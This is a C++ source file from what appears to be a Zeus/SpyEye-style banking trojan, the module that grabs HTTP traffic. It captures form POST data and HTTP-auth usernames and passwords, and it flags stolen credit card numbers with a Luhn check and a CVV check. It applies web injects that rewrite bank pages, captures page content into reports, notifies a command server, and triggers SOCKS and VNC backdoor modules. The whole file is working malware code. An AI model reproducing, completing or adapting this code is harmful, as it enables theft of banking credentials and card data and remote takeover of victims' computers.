#include <windows.h>
#include <shlwapi.h>
#include <wininet.h>

#include "defines.h"
#include "DllCore.h"
#include "httpgrabber.h"
#include "report.h"
#include "cryptedstrings.h"
#include "userhook.h"
#include "spyeye_modules.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\httptools.h"
#include "..\common\wininet.h"
#include "..\common\sync.h"
#include "..\common\debug.h"
#include "..\common\registry.h"


void HttpGrabber::init(void)
{

}

void HttpGrabber::uninit(void)
{

}

bool HttpGrabber::_matchUrlA(const LPSTR mask, const LPSTR url, DWORD urlSize, DWORD advFlags)
{
	Str::MATCHDATAA md;

	md.anyCharsSymbol = '*';
	md.anyCharSymbol  = '#';
	md.mask           = mask;
	md.maskSize       = Str::_LengthA(mask);
	md.string         = url;
	md.stringSize     = urlSize;
	md.flags          = Str::MATCH_FULL_EQUAL | advFlags;

	return Str::_matchA(&md);
}

bool HttpGrabber::_matchPostDataA(const LPSTR mask, const LPSTR postData, DWORD postDataSize)
{
	Str::MATCHDATAA md;

	md.anyCharsSymbol = '*';
	md.anyCharSymbol  = '?';
	md.mask           = mask;
	md.maskSize       = Str::_LengthA(mask);
	md.string         = postData;
	md.stringSize     = postDataSize;
	md.flags          = Str::MATCH_FULL_EQUAL | Str::MATCH_UNIVERSAL_NEWLINE;

	return Str::_matchA(&md);
}

bool HttpGrabber::_matchContextA(const LPSTR mask, const void *context, DWORD contextSize, DWORD advFlags)
{
	Str::MATCHDATAA md;

	md.anyCharsSymbol = '*';
	md.anyCharSymbol  = '?';
	md.mask           = mask;
	md.maskSize       = Str::_LengthA(mask);
	md.string         = (LPSTR)context;
	md.stringSize     = contextSize;
	md.flags          = Str::MATCH_UNIVERSAL_NEWLINE | Str::MATCH_SEARCH_SUBSSTRING | advFlags;

	return Str::_matchA(&md);
}

bool HttpGrabber::_matchContextExA(const void *mask, DWORD maskSize, const void *context, DWORD contextSize, LPDWORD offsetBegin, LPDWORD offsetEnd, DWORD advFlags)
{
	Str::MATCHDATAA md;

	md.anyCharsSymbol = '*';
	md.anyCharSymbol  = '?';
	md.mask           = (LPSTR)mask;
	md.maskSize       = maskSize;
	md.string         = (LPSTR)context;
	md.stringSize     = contextSize;
	md.flags          = Str::MATCH_UNIVERSAL_NEWLINE | Str::MATCH_SEARCH_SUBSSTRING | advFlags;

	if(Str::_matchA(&md))
	{
		if(offsetBegin)*offsetBegin = md.beginOfMatch;
		if(offsetEnd)*offsetEnd = md.endOfMatch;
		return true;
	}
	return false;
}

static bool luhn10(LPSTR ccStart,int start)
{
	int idSum = 0 ;
	int currentProcNum = 0 ;
	//WDEBUG2(WDDT_INFO,"SKSUMA: %s, VERJ@: %s", ccStart[start],ccStart[start+15]);
	for(int i=start+15; i>=start; i--)
	{
		int currentDigit = (int)(ccStart[i]) - 48;
		//WDEBUG1(WDDT_INFO, "STE TIV A: %u", currentDigit);
		if(currentProcNum%2 != 0)
		{
			if((currentDigit*= 2) > 9)
				currentDigit-= 9 ;
        }
		currentProcNum++ ;
		idSum += currentDigit ;

	}
	return (idSum%10 == 0) ;
}

static bool containsCVV(LPSTR postData, int postDataSize)
{
	bool result = false;
	
	for(int j=0;j<=postDataSize;j++)
	{
		if(postData[j] >= '0' && postData[j] <= '9') {
			for(int k=j;k<j+5 && postDataSize-j>2;k++)
			{
				if((k==j+2 || k==j+3) && (postData[k] >= '0' && postData[k] <= '9') && postData[j-1] == '=' && (postData[k+1] == '\n' || postData[k+2] == '\n')){result = true;}
				else if(!(postData[k] >= '0' && postData[k] <= '9')) break;
			}
		}
	}
	
	return result;
}

static bool isThereCC(LPSTR postData, int postDataSize)
{
	bool result = false;

	for(int j=0;j<=postDataSize;j++)
	{
		if(postData[j] >= '0' && postData[j] <= '9') {
			for(int k=j;k<j+17 && postDataSize-j>15;k++)
			{
				if(k==j+15 && (postData[k] >= '0' && postData[k] <= '9') && postData[j-1] == '=' && postData[k+1] == '\n'){if(luhn10(postData,j)) result = true;}
				else if(!(postData[k] >= '0' && postData[k] <= '9')) break;
			}
		}
	}
	
	return result==true && containsCVV(postData,postDataSize)==true;


}

/*
	Проверка запроса на необходимость инжекта.

	IN OUT requestData - запрос.

	Return             - true - инжекты применины,
	false - инжекты не применены
*/
static bool checkRequestForInject(HttpGrabber::REQUESTDATA *requestData)
{
	if(requestData->currentConfig == NULL)return false;

	DWORD listSize;
	LPBYTE list = (LPBYTE)BinStorage::_getItemDataEx(requestData->currentConfig, CFGID_HTTP_INJECTS_LIST, BinStorage::ITEMF_IS_OPTION, &listSize);

	requestData->injectsCount = 0;
	requestData->injects      = NULL;

	if(list != NULL && listSize > sizeof(HttpInject::HEADER))
	{
		WORD knownFlags               = requestData->verb == HttpGrabber::VERB_POST ? HttpInject::FLAG_REQUEST_POST : HttpInject::FLAG_REQUEST_GET;
		DWORD index                   = 0;
		HttpInject::HEADER *curInject = (HttpInject::HEADER *)list;
		LPBYTE endOfList              = list + listSize;

		while(HttpInject::_isCorrectHeader(curInject))
		{
			LPSTR p          = (LPSTR)curInject; //Переменная для легокого доступа к строкам.
			LPSTR urlMask    = p + curInject->urlMask;
			DWORD matchFlags = curInject->flags &  HttpInject::FLAG_URL_CASE_INSENSITIVE ? Str::MATCH_CASE_INSENSITIVE_FAST : 0;

			if((curInject->flags & knownFlags) == knownFlags && HttpGrabber::_matchUrlA(urlMask, requestData->url, requestData->urlSize, matchFlags))
			{
				//Проверяем пост-данные.
				if(curInject->postDataBlackMask > 0 && HttpGrabber::_matchPostDataA(p + curInject->postDataBlackMask, (LPSTR)requestData->postData, requestData->postDataSize) == true)
				{
					goto SKIP_ITEM;
				}
				if(curInject->postDataWhiteMask > 0 && HttpGrabber::_matchPostDataA(p + curInject->postDataWhiteMask, (LPSTR)requestData->postData, requestData->postDataSize) == false)
				{
					goto SKIP_ITEM;
				}


				//Все хорошо, собираем данные.
				{
					HttpGrabber::INJECTFULLDATA ifd;
#if defined WDEBUG2
					WDEBUG2(WDDT_INFO, "requestData->url=[%S] matched [%S].", requestData->url, urlMask);
#endif
					Mem::_zero(&ifd, sizeof(HttpGrabber::INJECTFULLDATA));

					ifd.flags       = curInject->flags;
					ifd.urlMask     = Str::_CopyExA(p + curInject->urlMask, -1);
					ifd.contextMask = curInject->contextMask == 0 ? NULL : Str::_CopyExA(p + curInject->contextMask, -1);
					

					if(curInject->flags & (HttpInject::FLAG_IS_INJECT | HttpInject::FLAG_IS_CAPTURE))
					{
						if((ifd.injects = (HttpInject::INJECTBLOCK *)BinStorage::_getItemDataEx(requestData->currentConfig, 1 + index, BinStorage::ITEMF_IS_HTTP_INJECT, &ifd.injectsSize)) != NULL &&
							HttpInject::_isCorrectBlockList(ifd.injects, ifd.injectsSize) &&
							Mem::reallocEx(&requestData->injects, sizeof(HttpGrabber::INJECTFULLDATA) * (requestData->injectsCount + 1)))
						{
							Mem::_copy(&requestData->injects[requestData->injectsCount++], &ifd, sizeof(HttpGrabber::INJECTFULLDATA));
						}
						else
						{
#if defined WDEBUG0
							WDEBUG0(WDDT_ERROR, "Current configuration corrupted!");
#endif

							Mem::free(ifd.injects);
							HttpGrabber::_freeInjectFullData(&ifd);

							_freeInjectFullDataList(requestData->injects, requestData->injectsCount);
							requestData->injectsCount = 0;
							break;
						}
					}
					//Неизвестно.
					else 
					{
						HttpGrabber::_freeInjectFullData(&ifd);
#if defined WDEBUG1
						WDEBUG1(WDDT_ERROR, "Unknown inject detected, curInject->flags=0x%08X!", curInject->flags);
#endif
					}
				}

SKIP_ITEM:;
			}

			//Вычисляем следующий элемент.
			curInject = (HttpInject::HEADER *)(((LPBYTE)curInject) + curInject->size);
			if(((LPBYTE)curInject) + sizeof(HttpInject::HEADER) > endOfList || ((LPBYTE)curInject) + curInject->size > endOfList)break;
			index++;
		}
	}

	Mem::free(list);
	return (requestData->injectsCount > 0);
}

/*
	Check if request is for capcha.

	IN requestData     - request.

	Return             - true - request is for captcha,
	false - request is not for captcha
*/
static bool checkRequestForCapchas(HttpGrabber::REQUESTDATA *requestData)
{
	// can only check if request matches image path, 
	if(requestData->currentConfig == NULL) return false;

	// no captchas in config
	if(BinStorage::_getItem(requestData->currentConfig, CFGID_CAPTCHA_SERVER, BinStorage::ITEMF_IS_OPTION) == NULL)
		return false;

	DWORD listSize;
	bool bRetVal = false;
	LPBYTE list = (LPBYTE)BinStorage::_getItemDataEx(requestData->currentConfig, CFGID_CAPTCHA_LIST, BinStorage::ITEMF_IS_OPTION, &listSize);

	if(list != NULL && listSize > sizeof(HttpInject::CAPTCHAENTRY))
	{
		HttpInject::CAPTCHAENTRY *curCaptcha = (HttpInject::CAPTCHAENTRY *)list;
		LPBYTE endOfList = list + listSize;

		while(curCaptcha)
		{
			LPSTR p          = (LPSTR)curCaptcha;
			LPSTR urlHost    = p + curCaptcha->urlHostMask;
			LPSTR urlImage   = p + curCaptcha->urlCaptcha;

			if(HttpGrabber::_matchUrlA(urlImage, requestData->url, requestData->urlSize, 0) && requestData->referer &&
				HttpGrabber::_matchUrlA(urlHost, requestData->referer, requestData->refererSize, 0))
			{
#if defined WDEBUG3
				WDEBUG3(WDDT_INFO, "requestData->url=[%S] matched captcha [%S, %S].", requestData->url, urlHost, urlImage);
#endif
				bRetVal = true;
				break;
			}

			//Вычисляем следующий элемент.
			curCaptcha = (HttpInject::CAPTCHAENTRY *)(((LPBYTE)curCaptcha) + curCaptcha->size);
			if(((LPBYTE)curCaptcha) + sizeof(HttpInject::CAPTCHAENTRY) > endOfList || ((LPBYTE)curCaptcha) + curCaptcha->size > endOfList)
				break;
		}
	}

	Mem::free(list);
	return bRetVal;
}

DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
{
#if defined WDEBUG6
	WDEBUG6(WDDT_INFO,
		"requestData->handle=[0x%p], requestData->url=[%S], requestData->referer=[%S], requestData->contentType=[%S], requestData->verb=[%u], requestData->postDataSize=[%u].",
		requestData->handle,
		requestData->url,
		requestData->referer,
		requestData->contentType,
		requestData->verb,
		requestData->postDataSize
		);
#endif

	//SpyEye_Modules::WebMainCallback(SpyEye_Modules::SM_FUNC_BEFOREPROCESSURL, requestData->url, requestData->verb == HttpGrabber::VERB_GET ? "GET" : "POST",requestData->

	DWORD retVal = 0;
	signed char writeReport = -1;/*-1 - по умолчанию, 0 - не писать, 1 - принудительно писать*/;

	//Проверяем запрос по фильтру.
	if(requestData->currentConfig != NULL)
	{
		DWORD httpFilterSize;
		LPSTR httpFilter = (LPSTR)BinStorage::_getItemDataEx(requestData->currentConfig, CFGID_HTTP_FILTER, BinStorage::ITEMF_IS_OPTION, &httpFilterSize);

		if(Str::_isValidMultiStringA(httpFilter, httpFilterSize))
		{      
			LPSTR curFilter = httpFilter;
			do if(curFilter[1] != 0)
			{ 
				//Опеределяем тип фильтра.
				char filterType;
				switch(curFilter[0])
				{
					case '$': filterType = 5; break; //Notify our server about request.
					case '!': filterType = 1; break; //Не писать в отчет,
					case '@': filterType = 2; break; //Screenshots
					default:  filterType = 0; break; //Принудительно писать в отчет.
				}
				if(filterType != 0)
					curFilter++;

				//Сравниваем URL.
				if(_matchUrlA(curFilter, requestData->url, requestData->urlSize, 0))
				{
#if defined WDEBUG3
					WDEBUG3(WDDT_INFO, "requestData->url=[%S] matched [%S] for filter type %u.", requestData->url, curFilter, filterType);
#endif

					switch(filterType)
					{
						case 0:
							{
								writeReport = 1;
								break;
							}
						case 1:
							{
								writeReport = 0;
								break;
							}
#if BO_KEYLOGGER > 0
						case 2:
						{
							char host[260];
							URL_COMPONENTSA uc;

							Mem::_zero(&uc, sizeof(URL_COMPONENTSA));
							uc.dwStructSize     = sizeof(URL_COMPONENTSA);
							uc.lpszHostName     = host;
							uc.dwHostNameLength = sizeof(host) / sizeof(char) - 1;

							if(CWA(wininet, InternetCrackUrlA)(requestData->url, requestData->urlSize, 0, &uc) == TRUE && uc.dwHostNameLength > 0)
							{
								UserHook::enableImageOnClick(USERCLICK2IMAGE_LIMIT, host);
							}
							break;
						}
#endif
						case 5:
							{
								retVal |= ANALIZEFLAG_NOTIFY_CC;
								break;
							}
					}
				}
			}
			while((curFilter = Str::_multiStringGetIndexA(curFilter, 1)));      
		}

		Mem::free(httpFilter);
	}

	//Проверяем тип содержимого.
	if(requestData->contentTypeSize >= (CryptedStrings::len_httpgrabber_urlencoded - 1))
	{
		if(CSTR_EQNA(requestData->contentType, CryptedStrings::len_httpgrabber_urlencoded - 1, httpgrabber_urlencoded) &&
			(requestData->contentType[CryptedStrings::len_httpgrabber_urlencoded - 1] == ';' || 
			requestData->contentType[CryptedStrings::len_httpgrabber_urlencoded - 1] == 0))
			retVal |= HttpGrabber::ANALIZEFLAG_POSTDATA_URLENCODED;
	}
	
	//Проверяем наличие HTTP-авторизации.
	LPWSTR authorizationData  = NULL;
	int authorizationDataSize = 0;
	if(requestData->authorizationData.userName != NULL && *requestData->authorizationData.userName != 0 && requestData->authorizationData.password != NULL && *requestData->authorizationData.password != 0)
	{
		CSTR_GETW(format, httpgrabber_auth_normal);
		authorizationDataSize = Str::_sprintfExW(&authorizationData, format, requestData->authorizationData.userName, requestData->authorizationData.password);
	}
	else if(requestData->authorizationData.unknownType != NULL && *requestData->authorizationData.unknownType != 0)
	{
		CSTR_GETW(format, httpgrabber_auth_encoded);
		authorizationDataSize = Str::_sprintfExW(&authorizationData, format, requestData->authorizationData.unknownType);
	}
	
	if(authorizationDataSize > 0)
	{
		retVal |= ANALIZEFLAG_AUTHORIZATION;
		
		// тут нужно проверять на дубли авторизации
	}
	
	//Опеределям нужно ли писать отчет.  
	{    
		if(writeReport == -1 && (requestData->verb == VERB_POST && requestData->postDataSize > 0) || retVal & ANALIZEFLAG_AUTHORIZATION)
			retVal |= ANALIZEFLAG_SAVED_REPORT;
		else if(writeReport == 1)
			retVal |= ANALIZEFLAG_SAVED_REPORT;
	}	
	
	if(retVal & ANALIZEFLAG_SAVED_REPORT)
	{
		LPSTR postData = NULL;
		bool ok = false;

		//Форматируем POST-запрос.
		if(retVal & HttpGrabber::ANALIZEFLAG_POSTDATA_URLENCODED)
		{
			if((postData = Str::_CopyExA((LPSTR)requestData->postData, requestData->postDataSize)) != NULL)
			{
				for(DWORD i = 0; i < requestData->postDataSize; i++)
				{
					if(postData[i] == '&')postData[i] = '\n';
					else if(postData[i] == '+')postData[i] = ' ';
				}
			}
		}
		// we dont need empty reports
		//else if(requestData->contentTypeSize == 0 || requestData->postDataSize == 0)
		//{
		//	postData = NULL;
		//}

		//Формируем отчет.
		if(postData != NULL)
		{
			LPWSTR urlUnicode = Str::_ansiToUnicodeEx(requestData->url, requestData->urlSize);

			if(urlUnicode != NULL)
			{
				URL_COMPONENTSA uc;

				Mem::_zero(&uc, sizeof(URL_COMPONENTSA));
				uc.dwStructSize = sizeof(URL_COMPONENTSA);

				if(CWA(wininet, InternetCrackUrlA)(requestData->url, requestData->urlSize, 0, &uc) == TRUE)
				{
					bool isCC = isThereCC(postData, requestData->postDataSize);
					LPWSTR reportString  = NULL;
					int reportSize = 0;
					CSTR_GETW(reportFormat, httpgrabber_report_format);
					LPWSTR userInput = NULL;
					LPWSTR referer = Str::_ansiToUnicodeEx(requestData->referer == NULL ? "-" : requestData->referer, -1);
#if BO_KEYLOGGER > 0
					UserHook::getInput(&userInput);
#endif
					reportSize = Str::_sprintfExW(&reportString, reportFormat, urlUnicode, referer, authorizationData == NULL ? L"" : authorizationData, userInput == NULL ? L"-" : userInput, postData);
					
					ok = Report::writeString(isCC == true ? BLT_REQUEST_WITH_CC : uc.nScheme == INTERNET_SCHEME_HTTPS ? BLT_HTTPS_REQUEST : BLT_HTTP_REQUEST, urlUnicode, reportString, reportSize);
					
					Mem::free(reportString);
					Mem::free(referer);
				}
				Mem::free(urlUnicode);
			}
			Mem::free(postData);
		}

		if(ok == false)
			retVal &= ~ANALIZEFLAG_SAVED_REPORT;
	}

	Mem::free(authorizationData);

	
	//Проверка на инжекты и фейки.
	if(checkRequestForInject(requestData))
	{
		retVal |= ANALIZEFLAG_URL_INJECT;
#if defined WDEBUG1
		WDEBUG1(WDDT_INFO, "Accepted %u injects for current URL.", requestData->injectsCount);
#endif
	}

	if(checkRequestForCapchas(requestData))
	{
		retVal |= ANALIZEFLAG_URL_CAPTCHA;
#if defined WDEBUG0
		WDEBUG0(WDDT_INFO, "Current URL detected as captcha request.");
#endif
	}


	if(retVal & ANALIZEFLAG_NOTIFY_CC)
	{
		if(BinStorage::_getItem(requestData->currentConfig, CFGID_NOTIFY_SERVER, BinStorage::ITEMF_IS_OPTION))
			Report::sendNotification(requestData->url);
	}

	//SpyEye_Modules::WebMainCallback(SpyEye_Modules::SM_FUNC_BEFOREPROCESSURL, requestData->url, requestData->verb == VERB_GET ? "GET" : "POST", requestData->headers, (LPSTR)requestData->postData, 0, 0);

END: 
	return retVal;
}

bool HttpGrabber::_executeInjects(const LPSTR url, LPBYTE *context, LPDWORD contextSize, const INJECTFULLDATA *dataList, DWORD count)
{
	DWORD changesCount = 0; //Кол. примененых инжектов.
	
	for(DWORD i = 0; i < count; i++)
	{
		INJECTFULLDATA *curData = (INJECTFULLDATA *)&dataList[i];
		DWORD matchFlags = curData->flags & HttpInject::FLAG_CONTEXT_CASE_INSENSITIVE ? Str::MATCH_CASE_INSENSITIVE_FAST : 0;

		//Проверка маски контента.
		if(curData->contextMask != NULL && !_matchContextA(curData->contextMask, *context, *contextSize, matchFlags | Str::MATCH_FULL_EQUAL))
		{
#if defined WDEBUG0
			WDEBUG0(WDDT_INFO, "Context no matched.");
#endif
			continue;
		}

		LPBYTE grabbedData     = NULL;
		DWORD  grabbedDataSize = 0;
		LPBYTE curBlock        = (LPBYTE)curData->injects;
		LPBYTE endBlock        = curBlock + curData->injectsSize;

		//Применяем инжекты, грабим данные.
		while(curBlock < endBlock)
		{
			//Ищим место замены.
			DWORD offsetBegin; //Начало данных для замены.
			DWORD offsetEnd;   //Конец данных для замены.
			HttpInject::INJECTBLOCK *blockPrefix = (HttpInject::INJECTBLOCK *)curBlock;
			HttpInject::INJECTBLOCK *blockPostfix  = (HttpInject::INJECTBLOCK *)((LPBYTE)blockPrefix + blockPrefix->size);
			HttpInject::INJECTBLOCK *blockNew    = (HttpInject::INJECTBLOCK *)((LPBYTE)blockPostfix + blockPostfix->size);

			curBlock = (LPBYTE)blockNew + blockNew->size; //Следующий элемент.

			//FIXME
			{
				char open_socks[] = "%opensocks%";
				if(Mem::_findData((LPBYTE)blockNew + sizeof(HttpInject::INJECTBLOCK), blockNew->size, open_socks, sizeof(open_socks) - 1)) 
				{
					/*WCHAR opensocksurl[MAX_PATH];
					Str::_ansiToUnicode(url, -1, opensocksurl, MAX_PATH);
					WDEBUG1(WDDT_INFO, "Found %%opensocks%% in %s", opensocksurl);
					SpyEye_Modules::COMMAND_LIST* cmd = (SpyEye_Modules::COMMAND_LIST*)Mem::alloc(sizeof(SpyEye_Modules::COMMAND_LIST));
					cmd->ModuleCrc32 = 0x3b4c3a7a;
					cmd->FunctionCrc32 = 0x6874548b;
					DWORD res = SpyEye_Modules::ExecuteCommands(cmd);
					WDEBUG1(WDDT_INFO, "%%opensocks%% result: %u", res);*/

					char socks_event[] = "Global\\s_ev";
					HANDLE socks_event_handle;
					if(!(socks_event_handle = CreateEventA(0, true, false, socks_event)))
					{
						WDEBUG0(WDDT_ERROR, "Event creation failed.");
					}
					else
					{
						SetEvent(socks_event_handle);
						CloseHandle(socks_event_handle);
						WDEBUG0(WDDT_INFO, "Event has been set!");
					}
				}
				char open_vnc[] = "%openvnc%";
				if(Mem::_findData((LPBYTE)blockNew + sizeof(HttpInject::INJECTBLOCK), blockNew->size, open_vnc, sizeof(open_vnc) - 1)) 
				{
					/*WCHAR opensocksurl[MAX_PATH];
					Str::_ansiToUnicode(url, -1, opensocksurl, MAX_PATH);
					WDEBUG1(WDDT_INFO, "Found %%opensocks%% in %s", opensocksurl);
					SpyEye_Modules::COMMAND_LIST* cmd = (SpyEye_Modules::COMMAND_LIST*)Mem::alloc(sizeof(SpyEye_Modules::COMMAND_LIST));
					cmd->ModuleCrc32 = 0x3b4c3a7a;
					cmd->FunctionCrc32 = 0x6874548b;
					DWORD res = SpyEye_Modules::ExecuteCommands(cmd);
					WDEBUG1(WDDT_INFO, "%%opensocks%% result: %u", res);*/

					char vnc_event[] = "Global\\v_ev";
					HANDLE vnc_event_handle;
					if(!(vnc_event_handle = CreateEventA(0, true, false, vnc_event)))
					{
						WDEBUG0(WDDT_ERROR, "Event #2 creation failed.");
					}
					else
					{
						SetEvent(vnc_event_handle);
						CloseHandle(vnc_event_handle);
						WDEBUG0(WDDT_INFO, "Event #2 has been set! ");
					}
				}
			}

			void* patternForReplace = Mem::_findData((LPBYTE)blockNew + sizeof(HttpInject::INJECTBLOCK), blockNew->size, "%BOTID%", 7);
			DWORD compIdSize = Str::_LengthW(coreDllData.compId);
			DWORD patternChangeSize = compIdSize - 7;
			if(patternForReplace && patternChangeSize > 0)
			{
				WDEBUG0(WDDT_INFO, "Found %BOTID% in inject.");
				void* newBlock = Mem::alloc(blockNew->size + patternChangeSize);
				LPSTR compid = Str::_unicodeToAnsiEx(coreDllData.compId, compIdSize);
				if(compid)
				{
					DWORD offsetSt = (LPBYTE)patternForReplace - (LPBYTE)blockNew;
					DWORD offsetEnd = ((LPBYTE)blockNew + blockNew->size) - (LPBYTE)patternForReplace;
					Mem::_copy(newBlock, (LPBYTE)blockNew, offsetSt);

					Mem::_copy((LPBYTE)newBlock + offsetSt, compid, compIdSize);
					Mem::_copy((LPBYTE)newBlock + offsetSt + compIdSize, (LPBYTE)blockNew + offsetSt + 7, offsetEnd);
					blockNew = (HttpInject::INJECTBLOCK*)newBlock;
					blockNew->size += patternChangeSize;

					Mem::free(compid);
				}
			}

			//Получаем позицию начала.
			if(blockPrefix->size == sizeof(HttpInject::INJECTBLOCK))
			{
				offsetBegin = 0;
			}
			else if(!_matchContextExA((LPBYTE)blockPrefix + sizeof(HttpInject::INJECTBLOCK), blockPrefix->size - sizeof(HttpInject::INJECTBLOCK), *context, *contextSize, NULL, &offsetBegin, matchFlags))
			{
				continue;
			}

			//Получаем позицию конца.
			if(blockPostfix->size == sizeof(HttpInject::INJECTBLOCK))
			{
				if(blockPrefix->size == sizeof(HttpInject::INJECTBLOCK))offsetEnd = *contextSize;
				else offsetEnd = offsetBegin;
			}
			else if(_matchContextExA((LPBYTE)blockPostfix + sizeof(HttpInject::INJECTBLOCK), blockPostfix->size - sizeof(HttpInject::INJECTBLOCK), *context + offsetBegin, *contextSize - offsetBegin, &offsetEnd, NULL, matchFlags))
			{        
				if(blockPrefix->size == sizeof(HttpInject::INJECTBLOCK))offsetBegin = offsetEnd;
				else offsetEnd += offsetBegin;
			}
			else
			{
				continue;
			}      

			DWORD blockNewDataSize = blockNew->size - sizeof(HttpInject::INJECTBLOCK); //Размер ставляемых данных.
			DWORD matchedDataSize  = offsetEnd - offsetBegin;                          //Размер наденых данных.

			//Замена.
			if(curData->flags & HttpInject::FLAG_IS_INJECT)
			{
				DWORD newSize = *contextSize - matchedDataSize + blockNewDataSize;
				LPBYTE newBuf  = (LPBYTE)Mem::alloc(newSize);

				if(newBuf != NULL) //Не обращаем внимание на ошибку.
				{
					Mem::_copy(newBuf,                                  *context,                                           offsetBegin);
					Mem::_copy(newBuf + offsetBegin,                    (LPBYTE)blockNew + sizeof(HttpInject::INJECTBLOCK), blockNewDataSize);
					Mem::_copy(newBuf + offsetBegin + blockNewDataSize, *context + offsetEnd,                               *contextSize - offsetEnd);
					if(patternForReplace) Mem::free(blockNew);

					Mem::free(*context);
					*context     = newBuf;
					*contextSize = newSize;

					changesCount++;
				}
			}
			//Сохранение.
			else if(curData->flags & HttpInject::FLAG_IS_CAPTURE)
			{
				if(Mem::reallocEx(&grabbedData, grabbedDataSize + blockNewDataSize + matchedDataSize + 1/*\n*/ + 1/*\0*/)) //Не обращаем внимание на ошибку.
				{
					if(blockNewDataSize > 0)
					{
						Mem::_copy(grabbedData + grabbedDataSize, (LPBYTE)blockNew + sizeof(HttpInject::INJECTBLOCK), blockNewDataSize);
						grabbedDataSize += blockNewDataSize;
					}
					Mem::_copy(grabbedData + grabbedDataSize, *context + offsetBegin, matchedDataSize);

					if(curData->flags & HttpInject::FLAG_CAPTURE_NOTPARSE)grabbedDataSize += matchedDataSize;
					else grabbedDataSize += HttpTools::_removeTagsA((LPSTR)grabbedData + grabbedDataSize, matchedDataSize);

					grabbedData[grabbedDataSize++] = '\n';
					grabbedData[grabbedDataSize]   = 0;
				}
			}
		}

		//Пишим награбленное.
		if(curData->flags & HttpInject::FLAG_IS_CAPTURE)
		{
			
			if(grabbedData != NULL)
			{
				if(curData->flags & HttpInject::FLAG_CAPTURE_TOFILE)
				{
					char host[260];
					URL_COMPONENTSA uc;

					Mem::_zero(&uc, sizeof(URL_COMPONENTSA));
					uc.dwStructSize     = sizeof(URL_COMPONENTSA);
					uc.lpszHostName     = host;
					uc.dwHostNameLength = sizeof(host) / sizeof(char) - 1;

					if(CWA(wininet, InternetCrackUrlA)(url, 0, 0, &uc) == TRUE && uc.dwHostNameLength > 0)
					{
						WCHAR file[MAX_PATH];
						SYSTEMTIME st;

						CWA(kernel32, GetSystemTime)(&st);            
						CSTR_GETW(decodedString, httpgrabber_inject_path_format);
						Str::_sprintfW(file, sizeof(file) / sizeof(WCHAR), decodedString, host, st.wYear - 2000, st.wMonth, st.wDay);
						Report::writeData(BLT_FILE, file, grabbedData, grabbedDataSize);
					}
				}
				else
				{
					LPWSTR urlW = Str::_ansiToUnicodeEx(url, -1);
					if(urlW != NULL)
					{
						LPWSTR report1 = NULL;
						CSTR_GETW(decodedString, httpgrabber_inject_grabbed_format);
						int r = Str::_sprintfExW(&report1, decodedString, urlW, grabbedData);
						if(r > 0) 
						{
							Report::writeString(BLT_GRABBED_HTTP, urlW, report1, r);
							Mem::free(report1);
						}
						Mem::free(urlW);
					}
				}
				Mem::free(grabbedData);
			}
		}

	}

	return (changesCount > 0);
}


void HttpGrabber::_freeRequestData(REQUESTDATA *requestData)
{
	Mem::free(requestData->url);
	Mem::free(requestData->referer);
	Mem::free(requestData->contentType);
}

void HttpGrabber::_freeInjectFullData(INJECTFULLDATA *data)
{
	Mem::free(data->urlMask);
	Mem::free(data->contextMask);
	Mem::free(data->injects);
}

void HttpGrabber::_freeInjectFullDataList(INJECTFULLDATA *dataList, DWORD count)
{
	while(count--)_freeInjectFullData(&dataList[count]);
	Mem::free(dataList);
}

